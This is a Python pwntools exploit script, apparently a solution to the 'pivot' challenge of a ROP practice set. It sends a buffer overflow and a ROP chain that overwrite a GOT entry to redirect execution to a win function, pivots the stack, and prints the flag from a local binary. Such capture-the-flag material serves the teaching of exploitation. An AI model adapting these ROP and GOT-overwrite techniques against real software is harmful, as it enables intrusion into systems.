from pwn import *

foothold_plt = 0x00400720
foothold_got = 0x00601040
win_offset = 0x00400a81 - 0x0040096a # Offset between the foothold and ret2win function

pop = 0x00400a2a # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_rbp = 0x004007c8 # pop rbp ; ret
pop_rsp = 0x00400a2d # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
add = 0x00400828 # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret

payload_1 = b"".join([
    b"B"*(2+8*2),
    p64(foothold_plt), # Populating the got
    p64(pop),
    p64(win_offset),
    p64(foothold_got+0x3d),
    b"B"*(8*4),
    p64(add), # Modifying got
    p64(foothold_plt), # Calling modified got == ret2win
])

payload_2 = b"".join([
    b"A"*40,
    p64(pop_rsp), # Stack pivot
])

p = process("./pivot")
#input()
p.send(payload_1+b"\n")
p.send(payload_2+b"\n")

#p.interactive()
p.recvuntil(b"pivot\n")
p.recvuntil(b"pivot\n")
flag = p.recv()
print(f"Flag: {flag}")
